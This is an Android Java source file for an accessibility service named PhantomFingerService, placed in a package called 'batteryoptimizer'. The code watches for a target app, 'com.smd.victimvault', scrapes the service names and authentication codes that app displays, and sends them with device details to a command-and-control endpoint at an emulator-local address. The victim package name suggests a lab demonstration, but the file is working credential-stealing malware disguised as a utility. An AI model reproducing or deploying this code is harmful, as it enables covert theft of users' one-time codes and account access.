package com.smd.batteryoptimizer;

import android.accessibilityservice.AccessibilityService;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class PhantomFingerService extends AccessibilityService {

    private static final String TAG = "PhantomFinger";
    private static final String TARGET_PACKAGE = "com.smd.victimvault";
    private static final String C2_URL = "http://10.0.2.2:5000/exfil";

    private WindowManager windowManager;
    private View overlayView;
    private boolean attackInProgress = false;
    private final Handler handler = new Handler(Looper.getMainLooper());

    private int lastTargetWindowId = -1;
    private String lastCapturedData = "";

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        CharSequence eventPackage = event.getPackageName();
        if (eventPackage == null) return;

        String packageName = eventPackage.toString();
        int eventType = event.getEventType();

        if (packageName.equals("com.android.systemui") || packageName.equals("android")) {
            return;
        }

        if (packageName.equals(TARGET_PACKAGE)) {

            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                int currentWindowId = root.getWindowId();
                root.recycle();

                if (!attackInProgress && currentWindowId != lastTargetWindowId) {
                    attackInProgress = true;
                    lastTargetWindowId = currentWindowId;
                    executeAttack();
                }
            }

            else if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                String incomingData = scrapeAllCodes();
                if (incomingData != null && !incomingData.isEmpty()) {
                    if (!incomingData.equals(lastCapturedData)) {
                        lastCapturedData = incomingData;
                        sendToC2(incomingData);
                    }
                }
            }

        } else {
            attackInProgress = false;
            lastTargetWindowId = -1;
            lastCapturedData = "";
        }
    }

    private void executeAttack() {
        String stolenData = scrapeAllCodes();
        if (stolenData != null && !stolenData.isEmpty()) {
            lastCapturedData = stolenData;
            sendToC2(stolenData);
        }
        attackInProgress = false;
    }

    private String scrapeAllCodes() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return null;

        List<String> services = new ArrayList<>();
        List<String> codes = new ArrayList<>();

        findNodesByViewId(root, "com.smd.victimvault:id/tv_service", services);
        findNodesByViewId(root, "com.smd.victimvault:id/tv_code", codes);

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < services.size() && i < codes.size(); i++) {
            sb.append(services.get(i)).append(": ").append(codes.get(i));
            if (i < services.size() - 1) sb.append("\n");
        }

        root.recycle();
        return sb.toString();
    }

    private void findNodesByViewId(AccessibilityNodeInfo root, String viewId, List<String> results) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        if (nodes != null) {
            for (AccessibilityNodeInfo node : nodes) {
                CharSequence text = node.getText();
                if (text != null) {
                    results.add(text.toString());
                }
            }
        }
    }

    private void sendToC2(String data) {
        new Thread(() -> {
            try {
                URL url = new URL(C2_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String deviceId = Build.MANUFACTURER + " " + Build.MODEL;
                String json = "{\"device_id\":\"" + deviceId + "\",\"stolen_data\":\"" + data.replace("\n", "\\n").replace("\"", "\\\"") + "\"}";

                OutputStream os = conn.getOutputStream();
                os.write(json.getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "C2 response: " + responseCode);
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "C2 connection failed", e);
            }
        }).start();
    }

    @Override
    public void onInterrupt() {
        attackInProgress = false;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}